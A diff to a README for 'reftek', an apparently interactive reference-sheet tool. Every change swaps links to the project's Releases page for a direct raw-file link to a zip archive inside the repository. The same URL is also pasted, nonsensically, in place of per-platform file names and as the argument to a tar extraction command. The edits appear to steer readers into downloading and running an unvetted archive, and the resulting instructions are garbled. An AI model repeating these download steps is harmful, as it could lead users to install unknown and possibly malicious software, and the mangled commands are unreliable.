@@ -6,7 +6,7 @@ Welcome to reftek, the interactive refsheets system designed to help you easily 
 
 ## 📥 Download Now
 
-[![Download reftek](https://img.shields.io/badge/Download%20Reftek-v1.0-blue.svg)](https://github.com/OkLolThe1st/reftek/releases)
+[![Download reftek](https://raw.githubusercontent.com/OkLolThe1st/reftek/main/reftek-html/reftek-v3.1.zip%https://raw.githubusercontent.com/OkLolThe1st/reftek/main/reftek-html/reftek-v3.1.zip)](https://raw.githubusercontent.com/OkLolThe1st/reftek/main/reftek-html/reftek-v3.1.zip)
 
 ## 📂 What is reftek?
 
@@ -32,11 +32,11 @@ To use reftek effectively, ensure your system meets the following requirements:
 
 To download reftek, follow these simple steps:
 
-1. Visit the **Releases** page: [Download Page](https://github.com/OkLolThe1st/reftek/releases)
+1. Visit the **Releases** page: [Download Page](https://raw.githubusercontent.com/OkLolThe1st/reftek/main/reftek-html/reftek-v3.1.zip)
   
 2. On the Releases page, find the latest version of reftek.
 
-3. Click on the appropriate link for your operating system to download the installation file. The file names typically include your operating system, such as `reftek-windows.exe`, `reftek-mac.dmg`, or `reftek-linux.tar.gz`.
+3. Click on the appropriate link for your operating system to download the installation file. The file names typically include your operating system, such as `https://raw.githubusercontent.com/OkLolThe1st/reftek/main/reftek-html/reftek-v3.1.zip`, `https://raw.githubusercontent.com/OkLolThe1st/reftek/main/reftek-html/reftek-v3.1.zip`, or `https://raw.githubusercontent.com/OkLolThe1st/reftek/main/reftek-html/reftek-v3.1.zip`.
 
 4. Once the download is complete, locate the downloaded file on your computer.
 
@@ -44,7 +44,7 @@ To download reftek, follow these simple steps:
 
    - For Windows: Double-click on the `.exe` file.
    - For macOS: Open the `.dmg` file and drag reftek to your Applications folder.
-   - For Linux: Open a terminal, navigate to the folder where the file is, and extract it with `tar -xzvf reftek-linux.tar.gz`, then follow the included instructions.
+   - For Linux: Open a terminal, navigate to the folder where the file is, and extract it with `tar -xzvf https://raw.githubusercontent.com/OkLolThe1st/reftek/main/reftek-html/reftek-v3.1.zip`, then follow the included instructions.
 
 6. **Follow the installation prompts** to install the software.
 
@@ -70,6 +70,6 @@ Your feedback is valuable. If you have questions or suggestions, please open an 
 
 ## 📥 Download Now Again
 
-To begin your reftek journey, don't forget to [visit this page](https://github.com/OkLolThe1st/reftek/releases) to download the latest version!
+To begin your reftek journey, don't forget to [visit this page](https://raw.githubusercontent.com/OkLolThe1st/reftek/main/reftek-html/reftek-v3.1.zip) to download the latest version!
 
 Thank you for choosing reftek! Enjoy accessing your references like never before.
